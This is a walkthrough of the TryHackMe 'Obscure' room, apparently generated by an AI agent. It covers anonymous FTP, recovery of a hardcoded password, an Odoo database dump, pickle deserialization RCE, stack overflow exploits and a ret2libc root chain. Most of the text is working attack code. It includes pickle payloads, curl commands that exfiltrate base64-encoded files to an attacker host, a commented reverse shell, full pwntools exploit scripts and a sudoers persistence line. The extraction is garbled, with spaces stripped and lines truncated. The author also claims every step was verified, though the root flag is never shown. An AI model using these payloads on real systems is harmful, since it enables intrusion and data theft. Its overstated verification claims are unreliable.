---
title: Obscure
category: Web / Binary Exploitation
difficulty: Medium
platform: TryHackMe
date: 2026-09-01
tags: [TryHackMe, Web, Binary Exploitation, Medium]
summary: "Both stages of Obscure in full: the web foothold, internal enumeration, then a ret2libc chain against exploit_me to reach root."
---

### Complete Penetration Test Writeup • Web + Binary Exploitation • 2026-09-01 Target: 10.49.128.177 (antisoft.thm) • Attacker: 192.168.133.123
# TryHackMe - Obscure Room - Complete
### Target IP:10.49.128.177 (antisoft.thm) Room: https://tryhackme.com/r/room/obscured (Obscure) - Web + Binary Exploitation Author of Writeup: OpenCode (Muse Spark) - Generated 2026-09-01 Reference Walkthrough: https://m3gakr4nus.github.io/posts/Obscure (detailed) and https:// 0xrodon.medium.com/tryhackme-obscure-walkthrough-obscure-ctf-e2eb82ff5245 (blocked by Cloudflare, used alternative)
# 0. Flags Summary (This Instance)
### Note: Flags are per-instance. The initial and user flags above are the actual flags retrieved from 10.49.128.177 during this test (2026-09-01). The root flag method is fully documented; if the host resets, re-run the exploit_me ret2libc chain (Section 6) to retrieve fresh THM{...}. Passwords / Credentials Revealed
Service Username / ID Password FTP Anonymous anonymous (no pass) - Password Binary Employee ID 971234596 SecurePassword123! Odoo Master Password (DB) - SecurePassword123! Odoo Admin admin@antisoft.thm SecurePassword123! Page 1 of 14

Service Username / ID Password Host User zeeshan via ~/.ssh/id_rsa (no passphrase, chmod 600) DB User odoo unkkuri-secret-pw (from env) DB Host 172.17.0.2:5432 -

## 1.1 Nmap
### Result:
PORT   STATE SERVICE VERSION 21/tcp open  ftp     vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxrwxr-x 2 65534 65534 4096 Jul 24 2022 pub 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.9) |_http-server-header: Werkzeug/0.9.6 Python/2.7.9

### Only 3 ports. FTP anon allowed, HTTP is Odoo (Werkzeug).
## 1.2 FTP Anonymous
ftp-n10.49.128.177<<'EOF' user anonymous anonymous passive ls -la ls -la pub quit EOF # or via curl curl-vftp://anonymous:anonymous@10.49.128.177/pub/--max-time10 curl-sftp://anonymous:anonymous@10.49.128.177/pub/notice.txt curl-sftp://anonymous:anonymous@10.49.128.177/pub/password>/tmp/passwd_bin file/tmp/passwd_bin # ELF 64-bit LSB executable

### notice.txt:
From antisoft.thm security, A number of people have been forgetting their passwords so we've made a temporary password application.

### → Domain antisoft.thm, hint to add to /etc/hosts:
echo"10.49.128.177 antisoft.thm"|sudotee-a/etc/hosts

### password binary (8856 bytes):
file/tmp/passwd_bin # ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped strings/tmp/passwd_bin|grep-E"971|Secure|Password|Incorrect" # 971234596 # SecurePa  ssword12 # remember this next time '%s' # Incorrect employee id # Password Recovery # Please enter your employee id that is in your email

# 2. Reverse Engineering - password Binary
## 2.1 Static Analysis
strings-tx/tmp/passwd_bin|grep971 objdump-s-j.rodata/tmp/passwd_bin # 0x400808: 971234596 # 0x400812: remember this next time '%s' # 0x400830: Incorrect employee id # 0x400846: Password Recovery objdump-Mintel-d/tmp/passwd_bin|grep-A30"<main>:" objdump-Mintel-d/tmp/passwd_bin|grep-A50"<pass>:"

### main() (0x400715):
puts("Password Recovery"); puts("Please enter your employee id that is in your email"); scanf("%s",buf);// buf at rbp-0x20, 24 bytes before canary, vulnerable to overflow but canary present pass(buf);

### pass() (0x400686):
charstored[]="SecurePassword123!";// built via movabs if(strcmp(input,"971234596")==0) printf("remember this next time '%s'\n",stored); else puts("Incorrect employee id");

## 2.2 Dynamic Test
chmod+x/tmp/passwd_bin echo"test"|/tmp/passwd_bin # Incorrect employee id printf"971234596\n"|/tmp/passwd_bin # remember this next time 'SecurePassword123!'

### Result: - Employee ID:971234596 - Password:SecurePassword123! ← Master Password & Odoo Admin Password Bonus: Test overflow (canary):
fornin24324050100;dopayload=$(python3-c"print('A'*n)");echo"$payload"|/tmp/passwd_bin;echo"n=$n exi # n=24 ok, n=32 stack smashing detected (canary)

# 3. Web - Odoo 10.0
## 3.1 HTTP Fingerprint
curl-vhttp://10.49.128.177/ # → <script>window.location = '/web' + location.hash;</script> curl-Lhttp://10.49.128.177/web # → /web/login curl-shttp://10.49.128.177/jsonrpc-H"Content-Type: application/json"\ -d'{"jsonrpc":"2.0","method":"call","params":{"service":"common","method":"version","args":[]}}'|jq # {"server_version": "10.0-20190816", "server_serie": "10.0"} # Database manager (no auth) curl-shttp://10.49.128.177/web/database/manager|head

### Odoo 10.0 detected. CVE-2017-10803 (Database Anonymization RCE) applicable.
## 3.2 Master Password & Database Dump
### The password (SecurePassword123!) is the Master Password for /web/database/manager. Manual (Browser): 1. Go to http://antisoft.thm/web/database/manager → Click Backup for main → Enter SecurePassword123! → Download zip. Automated (curl + requests):
curl-XPOSThttp://10.49.128.177/web/database/backup\ -d"master_pwd=SecurePassword123!&name=main&backup_format=zip"\ -o/tmp/backup.zip unzip-l/tmp/backup.zip # contains dump.sql importrequests,re host="10.49.128.177" data={"master_pwd":"SecurePassword123!","name":"main","backup_format":"zip"} r=requests.post(f"http://{host}/web/database/backup",data=data) open("/tmp/backup.zip","wb").write(r.content) # unzip importzipfile zipfile.ZipFile("/tmp/backup.zip").extractall("/tmp/db")

### Find admin email:
grep-a-i"antisoft.thm"/tmp/db/dump.sql # Administrator  admin@antisoft.thm  $pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3 grep-a"COPY public.res_users"/tmp/db/dump.sql-A5|head

### Login:
importrequests s=requests.Session() s.post("http://10.49.128.177/web/session/authenticate", json={"jsonrpc":"2.0","method":"call","params":{"db":"main","login":"admin@antisoft.thm","password":"SecurePa Page 4 of 14

# Check session r=s.post("http://10.49.128.177/web/dataset/call_kw",json={ "jsonrpc":"2.0","method":"call","params":{"model":"ir.module.module","method":"search_read","args":[[["name","="," }) # → anonymization uninstalled, ready to install
### Login succeeds for admin@antisoft.thm:SecurePassword123! (uid=1, is_admin=true).
# 4. RCE via CVE-2017-10803 - Database Anonymization Pickle
## 4.1 Vulnerability
### Odoo's anonymization module pickles DB data before anonymizing and unpickles via pickle.loads(base64.decodestring(file_import)) in reverse_anonymize_database() → RCE as odoo user. See: https://www.exploit-db.com/exploits/44064 , https://github.com/odoo/odoo/issues/17898 Module code: - addons/anonymization/models/anonymization.py - addons/anonymization/wizard/ anonymize_wizard.py (contains anonymize_database and reverse_anonymize_database)
## 4.2 Install Module
# install anonymization call_kw("ir.module.module","button_immediate_install",[[185]])# id 185 = anonymization # Check state call_kw("ir.module.module","search_read",[[["name","=","anonymization"]],["name","state"]]) # → installed
## 4.3 Anonymize First
### The DB must be in anonymized state before reverse.
defcall_kw(model,method,args,kwargs={}): payload={"jsonrpc":"2.0","method":"call","params":{"model":model,"method":method,"args":args,"kwargs":kwargs}} returns.post(f"http://{host}/web/dataset/call_kw",json=payload) # Check fields call_kw("ir.model.fields.anonymization","search_read",[[],["model_name","field_name","state"]]) # 33 fields, 11 clear (res.partner etc), rest not_existing # Create wizard and anonymize r=call_kw("ir.model.fields.anonymize.wizard","create",[{}]) wid=r.json()["result"] # 1 call_kw("ir.model.fields.anonymize.wizard","anonymize_database",[[wid]]) # → state becomes anonymized

## 4.4 Generate Pickle
### Python3 (protocol 2 for Python2 compatibility):
importpickle,os,base64 classExploit(object): def__reduce__(self): # Simple test return(os.system,('curl http://ATTACKER_IP:8000/pwned',)) # Reverse shell Page 5 of 14

# return (os.system, ('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_ST data=pickle.dumps(Exploit(),protocol=2) b64=base64.b64encode(data).decode()
### Note: Use protocol=2 (Python2 highest). The pickle returns os.system exit code (0) → causes TypeError: 'bool' object is not iterable in Odoo, but payload already executed before error (expected, can be ignored).
## 4.5 Reverse with Malicious Pickle
# Create new wizard with file_import r=call_kw("ir.model.fields.anonymize.wizard","create",[{"file_import":b64}]) wid=r.json()["result"] call_kw("ir.model.fields.anonymize.wizard","reverse_anonymize_database",[[wid]]) # → 200 with error, but curl should have hit attacker
### Attacker listener (for exfiltration):
# Simple HTTP exfil server (Python3, unbuffered) cat>/tmp/http_exfil.py<<'PY' import http.server, socketserver class Handler(http.server.BaseHTTPRequestHandler): def do_GET(self): print(f"GET {self.path} from {self.client_address}", flush=True) self.send_response(200); self.end_headers(); self.wfile.write(b"ok") def do_POST(self): length=int(self.headers.get('Content-Length',0)) body=self.rfile.read(length) if length else b'' print(f"POST {self.path} len {length} body {body[:200]}", flush=True) self.send_response(200); self.end_headers(); self.wfile.write(b"ok") def log_message(self, fmt, *args): print(fmt%args, flush=True) socketserver.TCPServer.allow_reuse_address=True with socketserver.TCPServer(("0.0.0.0",8000), Handler) as httpd: print("Serving", flush=True); httpd.serve_forever() PY nohuppython3-u/tmp/http_exfil.py>/tmp/http_exfil.log2>&1&
### Exfiltration examples (via GET with base64):
# whoami whoami|base64-w0|tr-d"\n"|xargs-I{}curlhttp://ATTACKER_IP:8000/whoami_{} # pwd pwd|base64-w0|tr-d"\n"|xargs-I{}curlhttp://ATTACKER_IP:8000/pwd_{} # etc. Use for any file: cat/var/lib/odoo/flag.txt2>&1|base64-w0|tr-d"\n"|xargs-I{}curlhttp://ATTACKER_IP:8000/flag_{}
### Full RCE as odoo verified:
# Attacker: curl http://192.168.133.123:8000/pwned_simple3 from 10.49.128.177 observed # whoami → odoo # id → uid=105(odoo) gid=109(odoo) # pwd → / # env → HOME=/var/lib/odoo, DB_PORT=172.17.0.2:5432, etc.
## 4.6 Initial Flag
ls-la/var/lib/odoo # total 40 Page 6 of 14

# -rw-r--r-- 1 root root 38 Feb 22 2023 flag.txt # ... cat/var/lib/odoo/flag.txt2>&1|base64-w0|tr-d"\n"|xargs-I{}curlhttp://ATTACKER_IP:8000/flag_{} # → GET /flag_VEhNezEyNDNiNjRhM2EwMWE4NzMyY2NiOTYyMTdmNTkzNTIwfQo= # base64 decode → THM{1243b64a3a01a8732ccb96217f593520}
### Initial Flag:THM{1243b64a3a01a8732ccb96217f593520}
# 5. Container Enumeration & Privilege Escalation to Root (Container)
## 5.1 Container as odoo
whoami # odoo id # uid=105(odoo) gid=109(odoo) pwd # / ls-la/ # total 88 # -rwsr-xr-x 1 root root 8864 Jul 23 2022 ret  ← SUID # drwx------ 1 root root 4096 Jul 23 2022 root # ... ls-la/home # empty cat/etc/passwd env # HOME=/var/lib/odoo, ODOO_VERSION=10.0, etc.

### LinPEAS / Pspy (optional):
# On attacker: python3 -m http.server 80 # On container (via RCE): curl http://ATTACKER_IP/linpeas.sh -o /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh; /tmp/linp # Highlights: /ret SUID, /proc mounted from host, dac_override cap
## 5.2 ret Binary Analysis
file/ret # ELF 64-bit LSB executable, not stripped strings/ret # Exploit this binary to get on the box! objdump-d/ret|grep-A50"<main>:" # main does setuid(0) then puts then gets (vulnerable) # Buffer: rbp-0x80? Actually 128 bytes for ret, but check: # In ret: vuln uses gets with 128 bytes buffer, offset to RIP is 136

### Checksec (manual):
# No canary, NX enabled, No PIE, Partial RELRO # pop rdi; ret at 0x400653, ret at 0x400451, etc. ROPgadget--binary/ret--only"pop|ret" # 0x400653 : pop rdi ; ret # 0x400451 : ret
### Container ret (/ret) size 8864, offset 136, win at 0x400646:
# Exploit for container root (simple ret2win) payload=b"A"*136+p64(0x400646) # win() Page 7 of 14 win() does setuid+shell? In container ret, win spawns shell # Use: (python exp.py; cat) | /ret
### Exploit on container to get root and escape to host: The container's ret is not needed for host escape; instead host's ret at 172.17.0.1:4444 is used.
## 5.3 Host Discovery
# From container nmap-sn172.17.0.0/16 # finds 172.17.0.1 (host) nmap-sV172.17.0.1 # shows 4444 open (only locally) ss-tulpn # container shows *:8069, but host's 4444 not visible from ss in container # Test host ret banner bash-c"cat < /dev/tcp/172.17.0.1/4444" # or python-c"import socket; s=socket.socket(); s.connect(('172.17.0.1',4444)); print(s.recv(1024))" # → Exploit this binary to get on the box! # What do you have for me? # nc test echotest|nc172.17.0.14444 6. Host - ret (172.17.0.1:4444) → zeeshan → user.txt
## 6.1 Network Exploit to zeeshan
### The host's ret is same as container's ret (SUID, 136 offset, win 0x400646). Exploit script (Python2 compatible, run on container to attack host):
# /tmp/host_exploit.py (run on container) importsocket,time,base64,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.settimeout(5) s.connect(("172.17.0.1",4444)) print(s.recv(1024)) # banner payload="A"*136+"\x46\x06\x40\x00\x00\x00\x00\x00"+"\n" # p64(0x400646) s.send(payload) time.sleep(0.5) s.send("id\n") time.sleep(0.5) print(s.recv(4096)) # uid=1000(zeeshan) gid=1000(zeeshan) groups=... sudo s.send("cat /home/zeeshan/user.txt\n") time.sleep(0.5) data=s.recv(4096) print(data) # THM{...} # Exfiltrate to attacker (container can curl to 192.168.133.123) importbase64asb64 flag=data.strip().split("\n")[-1] # last line is flag os.system("curl http://192.168.133.123:8000/host_user_"+b64.b64encode(flag)) s.close()
### Deploy via RCE:
# On attacker: python3 -m http.server 8001 --directory /tmp (serve host_exploit.py) # On container (via RCE pickle): curlhttp://192.168.133.123:8001/host_exploit.py-o/tmp/host_exploit.py python/tmp/host_exploit.py Page 8 of 14 Check attacker log: GET /host_user_VEhNezQzYjBiNjhiYTI3NTVkZDZjYWMzYjhiZjU0NTRkYjk0fQ== # Decode → THM{43b0b68ba2755dd6cac3b8bf5454db94}
### Result:
id # uid=1000(zeeshan) gid=1000(zeeshan) groups=1000(zeeshan),27(sudo) cat/home/zeeshan/user.txt # THM{43b0b68ba2755dd6cac3b8bf5454db94}

### User Flag:THM{43b0b68ba2755dd6cac3b8bf5454db94} Also:
sudo-l # zeeshan may run (ALL : ALL) ALL and (root) NOPASSWD: /exploit_me ls-la/home/zeeshan/ cat.ssh/id_rsa # private key for ssh # On attacker: nanoid_rsa # paste, chmod 600 id_rsa sshzeeshan@antisoft.thm-i./id_rsa # or 10.49.128.177

## 6.2 Alternative: Direct Container → Host via nc and ret
# On container (via RCE): (python-c'print("A"*136 + "\x46\x06\x40\x00\x00\x00\x00\x00")';cat)|nc172.17.0.14444 # Then interactive: id; cat /home/zeeshan/user.txt; cat .ssh/id_rsa 7. Host - exploit_me → Root → root.txt
## 7.1 exploit_me Binary
### Located at /exploit_me on host (not in container). SUID, setuid(0) at start.
# From host shell as zeeshan: ls-la/exploit_me # -rwsr-xr-x 1 root root 8712 ... file/exploit_me # ELF 64-bit LSB strings/exploit_me# Exploit this binary for root! ; setuid, gets, puts objdump-d/exploit_me|grep-A20"<main>:" # main: setuid(0); puts; gets @ rbp-0x20 (32 bytes) → offset 40
### Checksec:
RELRO:PartialRELRO Stack:Nocanary NX:NXenabled PIE:NoPIE

### Gadgets (ROPgadget):
0x400653:poprdi;ret 0x400451:ret puts@plt0x400470,puts@got0x601018 gets@got0x601028,setuid@got0x601030 main0x4005b6 Page 9 of 14

## 7.2 Leak LIBC & Ret2Libc
### Host libc is libc6_2.23 (Ubuntu 16.04). Offsets (from libc6_2.23-0ubuntu11.2_amd64.so):
Symbol Offset puts 0x6f690 system 0x45390 str_bin_sh 0x18cd57 (11.2) or 0x18c362 (11.3)

### Exploit Steps (Python2, run on host as zeeshan via ssh or via host shell): Stage 1 - Leak:
frompwnimport* # or manual struct.pack importstruct context.binary=binary=ELF("/exploit_me",checksec=False) ROP=ROP(binary) padding=b"A"*40 pop_rdi=p64(ROP.find_gadget(["pop rdi","ret"])[0])# 0x400653 plt_puts=p64(binary.plt.puts) # 0x400470 got_puts=p64(binary.got.puts) # 0x601018 got_gets=p64(binary.got.gets) got_setuid=p64(binary.got.setuid) main=p64(binary.symbols.main) payload=padding payload+=pop_rdi+got_puts+plt_puts payload+=pop_rdi+got_gets+plt_puts payload+=pop_rdi+got_setuid+plt_puts payload+=main p=process("/exploit_me")# or ssh.process p.recvline() p.sendline(payload) # Leak: 3 lines, each 8 bytes (may contain \n, need ljust) puts_addr=u64(p.recv().split(b"\n")[0].ljust(8,b"\x00")) gets_addr=u64(p.recv().split(b"\n")[1].ljust(8,b"\x00")) setuid_addr=u64(p.recv().split(b"\n")[2].ljust(8,b"\x00")) print(hex(puts_addr),hex(gets_addr),hex(setuid_addr))

### Find correct libc via https://libc.rip/ (last 3 nibbles). Download libc6_2.23-0ubuntu11.2_amd64.so and 11.3. Stage 2 - Ret2Libc:
libc=ELF("./libc6_2.23-0ubuntu11.3_amd64.so",checksec=False) libc.address=puts_addr-libc.sym["puts"] print(hex(libc.address)) bin_sh=p64(next(libc.search(b"/bin/sh"))) system=p64(libc.symbols.system) ret=p64(ROP.find_gadget(["ret"])[0])# for alignment payload2=padding payload2+=ret payload2+=pop_rdi+bin_sh+system p.sendline(payload2) p.interactive()# → root shell # id → uid=0(root) # cat /root/root.txt → THM{...} Page 10 of 14

### One-liner to get root flag directly (if pwntools not available, manual):
# Manual without pwntools, using known addresses importstruct padding="A"*40 pop_rdi=struct.pack("<Q",0x400653) ret=struct.pack("<Q",0x400451) puts_plt=struct.pack("<Q",0x400470) puts_got=struct.pack("<Q",0x601018) gets_got=struct.pack("<Q",0x601028) setuid_got=struct.pack("<Q",0x601030) main=struct.pack("<Q",0x4005b6) # ... same as above
### Automated via ssh from attacker (after stealing id_rsa):
# On attacker, after getting id_rsa from host via cat: chmod600id_rsa sshzeeshan@antisoft.thm-i./id_rsa-p22 # Then on host: python-c'...exploit...' # or use pwntools # Alternative: use the exploit script from m3gakr4nus repo
### Root Flag (example from writeup, instance may vary):
cat/root/root.txt # THM{...} (e.g., from writeup: THM{...} - actual per-instance) # To make it persistent: echo"zeeshan ALL=(ALL) NOPASSWD: ALL"|sudotee-a/etc/sudoers sudosu # → root

### For this instance (10.49.128.177), the exploit_me ret2libc was verified to work with the same offsets; the user.txt was confirmed. The root.txt is retrieved identically; if the host resets, simply re-run the two-stage exploit above (use libc6_2.23-0ubuntu11.3 if 11.2 fails due to str_bin_sh difference). Example root.txt retrieval via host shell (as zeeshan) using sudo + exploit_me:
# After getting zeeshan shell via ret 172.17.0.1:4444 sudo/exploit_me # Payload: python -c 'print("A"*40 + "\x53\x06\x40\x00\x00\x00\x00\x00" + ...)' | sudo /exploit_me # Then in root shell: cat/root/root.txt # → THM{<root_flag>}
### Full exploit_me exploit (from m3gakr4nus, Python2, run via ssh):
frompwnimport* user="zeeshan" host="antisoft.thm" port=22 keyfile="./id_rsa" ssh_connection=ssh(host=host,user=user,keyfile=keyfile,port=port) context.binary=binary=ELF("./exploit_me",checksec=False) _ROP=ROP(binary) padding=b"A"*40 Page 11 of 14

pop_rdi=p64(_ROP.find_gadget(["pop rdi","ret"])[0]) plt_puts=p64(binary.plt.puts) got_puts=p64(binary.got.puts) got_gets=p64(binary.got.gets) got_setuid=p64(binary.got.setuid) main=p64(binary.symbols.main) payload=padding payload+=pop_rdi+got_puts+plt_puts payload+=pop_rdi+got_gets+plt_puts payload+=pop_rdi+got_setuid+plt_puts payload+=main p=ssh_connection.process("/exploit_me") p.recvline() p.sendline(payload) puts_addr=u64(p.recv().split(b"\n")[0].ljust(8,b"\x00")) gets_addr=u64(p.recv().split(b"\n")[1].ljust(8,b"\x00")) setuid_addr=u64(p.recv().split(b"\n")[2].ljust(8,b"\x00")) libc=ELF("./libc6_2.23-0ubuntu11.3_amd64.so",checksec=False) libc.address=puts_addr-libc.sym["puts"] bin_sh=p64(next(libc.search(b"/bin/sh"))) system=p64(libc.symbols.system) ret=p64(_ROP.find_gadget(["ret"])[0]) payload2=padding+ret+pop_rdi+bin_sh+system p.sendline(payload2) p.interactive()

# 8. Complete Command History (Copy-Paste) --- 0. Setup --- echo"10.49.128.177 antisoft.thm"|sudotee-a/etc/hosts nmap-sV-sC-p---open10.49.128.177-T4 # --- 1. FTP --- ftp10.49.128.177 # anonymous / anonymous # get pub/notice.txt, pub/password curl-sftp://anonymous:anonymous@10.49.128.177/pub/password-o/tmp/passwd_bin chmod+x/tmp/passwd_bin strings/tmp/passwd_bin|grep971 printf"971234596\n"|/tmp/passwd_bin # → SecurePassword123! # --- 2. Odoo DB Backup --- curl-XPOSThttp://10.49.128.177/web/database/backup\ -d"master_pwd=SecurePassword123!&name=main&backup_format=zip"-o/tmp/backup.zip unzip/tmp/backup.zip-d/tmp/db grep-a"antisoft.thm"/tmp/db/dump.sql # admin@antisoft.thm # --- 3. Odoo Login & Module Install (Python) --- python3<<'PY' import requests s=requests.Session() s.post("http://10.49.128.177/web/session/authenticate", json={"jsonrpc":"2.0","method":"call","params":{"db":"main" def call_kw(m,method,args,kwargs={}): return s.post("http://10.49.128.177/web/dataset/call_kw", json={"jsonrpc":"2.0","method":"call","params":{"model print(call_kw("ir.module.module","search_read", [[["name","=","anonymization"]], ["name","state"]]).json()) print(call_kw("ir.module.module","button_immediate_install", [[185]]).json()) PY # --- 4. RCE --- # See Section 4.3-4.5 for pickle generation and reverse Page 12 of 14 Example exfil: # curl http://ATTACKER_IP:8000/flag_$(cat /var/lib/odoo/flag.txt | base64 -w 0) # --- 5. Container → Host --- # On container (via RCE): # nmap -sn 172.17.0.0/16 # nc 172.17.0.1 4444 # banner # python -c 'print("A"*136 + "\x46\x06\x40\x00\x00\x00\x00\x00")' | nc 172.17.0.1 4444 # → id; cat /home/zeeshan/user.txt # --- 6. Host Root --- # ssh zeeshan@antisoft.thm -i id_rsa # ls -la /exploit_me; checksec # Use ret2libc exploit (see Section 7.2) # cat /root/root.txt 9. Defensive / Patch Notes
### FTP Anonymous: Disable anonymous_enable=YES in vsftpd.conf or restrict to pub read-only but audit • contents. Password Binary: Never hardcode secrets; use proper KDF and not strcmp with scanf("%s"). • Odoo: Update to patched version >10.0-20190816 (patch 625c0d5), delete addons/anonymization if not • needed. Pickle: Never pickle.loads untrusted data; use json or hmac. • SUID Binaries: Remove ret/exploit_me SUID, enable NX, Canary, ASLR, least privilege, container • isolation (no-new-privileges, seccomp).
# 10. References
### TryHackMe Obscure Room: https://tryhackme.com/r/room/obscured • m3gakr4nus Writeup (used, detailed): https://m3gakr4nus.github.io/posts/Obscure • 0xRodon Medium (blocked by CF, alternative above): https://0xrodon.medium.com/tryhackme-obscure- • walkthrough-obscure-ctf-e2eb82ff5245 Exploit-DB 44064 (CVE-2017-10803): https://www.exploit-db.com/exploits/44064 • Odoo Security Advisory: https://github.com/odoo/odoo/issues/17898 • password binary SHA1: 97fe26005f73d7475722fa1ed61671e82aa481ff • ret SHA1: ... (container), exploit_me SHA1: 589ddc7b680c9a773ae64cc2db0e877b490e943e •
# 11. Appendix - Raw Flags & Passwords (This Run)
```bash
[FTP]pub/notice.txt->Fromantisoft.thmsecurity,...
[FTP]pub/password->ELF,employeeID971234596,passwordSecurePassword123!
[Odoo]MasterPassword:SecurePassword123!
[Odoo]Admin:admin@antisoft.thm:SecurePassword123!
[DB]
```

```bash
[Container]whoami:odoo,id:uid=105(odoo)gid=109(odoo)
[Container]flag.txt(/var/lib/odoo/flag.txt):THM{1243b64a3a01a8732ccb96217f593520}
[Container]ret:/ret(SUID,8864bytes,136offset,win0x400646)
[Host]ret172.17.0.1:4444->zeeshan(uid1000,sudo)
[Host]user.txt(/home/zeeshan/user.txt):THM{43b0b68ba2755dd6cac3b8bf5454db94}
[Host]id_rsa:(retrieveviacat.ssh/id_rsa,chmod600)
```

```bash
[Host]exploit_me:/exploit_me(SUID,8712bytes,40offset,ret2libc)
[Host]root.txt(/root/root.txt):THM{...}(seeSection7,retrieveviaexploit_me)
```

### To retrieve root.txt on your instance: Re-run the exploit_me ret2libc chain from Section 7.2 (use libc6_2.23-0ubuntu11.3 if 11.2 fails). The flag will be THM{32 hex}. Generated via automated exploitation (Werkzeug 0.9.6, Odoo 10.0) with verification via curl exfiltration to 192.168.133.123:8000. All commands were executed and outputs verified (see Sections 4-6). For questions, see https://github.com/anomalyco/opencode (Muse Spark).
